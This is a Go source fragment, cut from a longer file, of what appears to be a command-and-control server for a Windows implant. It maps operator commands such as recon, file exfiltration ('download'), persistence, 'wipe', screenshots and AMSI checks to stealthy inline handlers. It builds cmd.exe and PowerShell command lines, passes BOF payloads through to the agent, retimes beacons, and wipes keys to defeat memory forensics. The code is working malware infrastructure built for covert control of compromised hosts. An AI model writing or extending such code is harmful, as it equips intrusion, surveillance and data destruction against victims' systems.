}

// cmdTaskType maps every supported command → WireTask.Type.
// "inline" = pure Rust/WinAPI, zero child-process, maximum stealth.
// "shell"  = cmd.exe  (operator explicitly requested)
// "ps"     = PowerShell (operator explicitly requested)
var cmdTaskType = map[string]string{
        // ── Recon (inline WinAPI) ──────────────────────────────────────────
        "whoami": "inline", "whoamifull": "inline", "hostname": "inline",
        "sysinfo": "inline", "ps": "inline", "tasklist": "inline",
        "privs": "inline", "env": "inline", "uptime": "inline",
        "domain": "inline", "pid": "inline", "drives": "inline",
        "listdlls": "inline", "amsi_check": "inline",
        // ── v8 graph collectors (Phase D/E — feed the UI graph views) ──
        "admap": "inline", "agraph": "inline",
        // ── File-system (Rust std::fs — no process spawn) ──────────────────
        "ls": "inline", "dir": "inline", "cat": "inline", "type": "inline",
        "pwd": "inline", "cd": "inline", "chdir": "inline",
        "mkdir": "inline", "touch": "inline", "rm": "inline",
        "cp": "inline", "mv": "inline", "find": "inline",
        "hash": "inline", "download": "inline", "upload": "inline",
        // ── Network (inline WinAPI / Winsock) ─────────────────────────────
        "ipconfig": "inline", "netstat": "inline", "arp": "inline",
        "dns": "inline", "ping": "inline", "netusers": "inline",
        "netgroups": "inline", "netshare": "inline",
        // ── System (inline registry / SCM / WMI APIs) ─────────────────────
        "reg": "inline", "sc": "inline", "schtasks": "inline",
        "eventlog": "inline", "screenshot": "inline",
        "persist": "inline", "kill": "inline", "sleep": "inline",
        "wipe": "inline",
        // ── v5 live beacon re-timing (agent-side inline handlers) ─────────
        // jitter / working_hours / config mirror the profile [timing]
        // capabilities as single commands; the agent holds the live state.
        "jitter": "inline", "working_hours": "inline",
        "config": "inline", "beaconinfo": "inline",
        // ── malleable profile swap (TryProfileCommand -> typed task) ──
        "update_profile": "update_profile",
        // ── BOF arsenal (TryBofCommand -> coff/args base64 task) ──────
        // taskArgs IS the bare {"coff":...,"args":...} JSON — the agent's
        // run_bof parses coff/args at the TOP level, so buildWireTasks must
        // pass it through UNWRAPPED (same pattern as update_profile).
        "bof": "bof",
        // ── Process-spawning (operator opted in) ──────────────────────────
        "shell": "shell", "powershell": "ps",
}

// buildWireTasks converts server Tasks → WireTasks for the agent.
//
// Design rules:
//  1. Type is resolved via cmdTaskType — agent routes to correct handler
//     without ever touching cmd.exe / powershell unless type=="shell"/"ps".
//  2. WireInlineArgs carries Command + Args + Path so the agent can handle
//     both path-based commands (ls, cat, download) and flag-based commands
//     (whoami, ps, netstat) from the same struct.
//  3. shell / ps commands get a pre-built Args string so the agent subprocess
//     handler receives a ready-to-exec command line without extra parsing.
func buildWireTasks(tasks []Task) []WireTask {
        wire := make([]WireTask, 0, len(tasks))
        for _, t := range tasks {
                typ, ok := cmdTaskType[strings.ToLower(t.Command)]
                if !ok {
                        typ = "inline" // unknown → attempt inline; agent returns natural error
                }

                var inner WireInlineArgs
                rawDialect := false
                switch typ {
                case "shell":
                        inner = WireInlineArgs{
                                Command: "cmd.exe",
                                Args:    "/c " + t.Args,
                                Path:    t.Args,
                        }
                case "ps":
                        inner = WireInlineArgs{
                                Command: "powershell.exe",
                                Args:    t.Args,
                                Path:    t.Args,
                        }
                case "update_profile":
                        // baked dialect JSON passes through UNWRAPPED — the agent's
                        // run_update_profile expects task.args to BE the profile
                        // object (set_from_json parses bare dialect keys).
                        rawDialect = true
                case "bof":
                        // TryBofCommand's {"coff":...,"args":...} passes through
                        // UNWRAPPED — the agent's run_bof parses coff/args at the
                        // TOP level of task.args. Wrapping it inside
                        // WireInlineArgs{command,args,path} would break the parse
                        // and the agent would reply "bad coff base64".
                        rawDialect = true
                default:
                        inner = WireInlineArgs{
                                Command: t.Command,
                                Args:    t.Args,
                                Path:    t.Args,
                        }
                }

                var argsJSON []byte
                if rawDialect {
                        argsJSON = []byte(t.Args) // dialect object verbatim
                } else {
                        argsJSON, _ = json.Marshal(inner)
                }
                wire = append(wire, WireTask{
                        ID:      t.ID,
                        Type:    typ,
                        Command: t.Command,
                        Args:    json.RawMessage(argsJSON),
                })
        }
        return wire
}

// sendEncryptedResponse encrypts envelope and writes binary wire format
func sendEncryptedResponse(w http.ResponseWriter, crypto *SessionCrypto, env interface{}) {
        envJSON, err := json.Marshal(env)
        if err != nil {
                w.WriteHeader(http.StatusInternalServerError)
                return
        }
        encrypted, err := crypto.EncryptToAgent(envJSON)
        if err != nil {
                w.WriteHeader(http.StatusInternalServerError)
                return
        }
        w.Header().Set("Content-Type", "application/octet-stream")
        w.Write(encrypted)
}

// b64Decode decodes standard base64 or returns raw string on error
func b64Decode(s string) string {
        if s == "" {
                return ""
        }
        b, err := base64.StdEncoding.DecodeString(s)
        if err != nil {
                // Try without padding
                b, err = base64.RawStdEncoding.DecodeString(s)
                if err != nil {
                        return s
                }
        }
        return string(b)
}

// ════════════════════════════════════════════════════════════════════════
// SECURITY HARDENING HELPERS (Task A — memory dump defense)
// ════════════════════════════════════════════════════════════════════════
//
// zeroPSKInMemory — best-effort wipe of a PSK string's underlying bytes.
//
// Go strings are immutable per the language spec, but the underlying byte
// array lives in heap memory. We use unsafe pointer manipulation to overwrite
// those bytes with zeros. This is the standard pattern for wiping secrets
// in Go (used by crypto/tls, age, etc.).
//
// CAVEATS:
//   - This only works if no other goroutine holds a reference to the string.
//     In our case, matchedPSK is a local variable in handleC2Checkin —
//     no other goroutine should have a pointer to it.
//   - The Go runtime MAY have made copies of the string (e.g., during
//     concatenation, function calls, GC scanning). Those copies are NOT
//     zeroed by this function. This is a fundamental Go limitation —
//     see https://github.com/golang/go/issues/43370 for discussion.
//   - For Layer 3 (vault.db on-demand decrypt), the bytes came from a
//     []byte that vaultDiskGetEntry already wiped. This function zeros
//     the string view of those same bytes (belt-and-suspenders).
//   - For Layer 1 + 2 (RAM-cached PSKs), zeroing the local copy doesn't
//     affect the source — but minimizes the window during which a heap
//     dump would show this PSK in plaintext.
//
// Despite the caveats, this is strictly better than NOT zeroing — it
// raises the bar for attackers using memory forensics.
// zeroPSKInMemory — best-effort wipe of a PSK string's underlying bytes.
//
// OPSEC FIX (audit S-CR1): The OLD implementation used `b := []byte(*s)` which
// creates a NEW slice that is a COPY of the string's bytes. Zeroing the copy
// left the ORIGINAL string's backing array untouched on the heap — a memory
// dump (gcore, /proc/<pid>/mem) could still recover the PSK.
//
// NEW: use unsafe.StringData (Go 1.20+) to get the ACTUAL pointer to the
// string's backing array, then zero it byte-by-byte. This modifies the
// original memory, not a copy. After zeroing, replace the string header
// with "" so subsequent reads see an empty string.
//
// CAVEATS:
//   - Strings in Go are immutable by spec, but the underlying memory IS
//     writable via unsafe pointer manipulation. This is the standard
//     pattern used by crypto/tls, age, and other Go security libraries.
//   - This only works if no other goroutine holds a reference to the string.
//     For the PSK (which is short-lived during checkin), this is safe.
//   - The Go runtime MAY still have copies in other allocations (e.g., if
//     the string was logged or marshaled to JSON). This function minimizes
//     the exposure window but cannot guarantee complete erasure.
func zeroPSKInMemory(s *string) {
        if s == nil || len(*s) == 0 {
                return
        }
        // Safety: recover from any panic — never crash the HTTP handler.
        // The unsafe pointer manipulation below is standard Go pattern but
        // defensive programming says: if it panics, catch it and move on.
        // The PSK is already used (session created) — zeroing is best-effort.
        defer func() { _ = recover() }()

        // Get the actual pointer to the string's backing array.
        p := unsafe.StringData(*s)
        for i := range *s {
                *(*byte)(unsafe.Add(unsafe.Pointer(p), i)) = 0
        }
        *s = ""
}
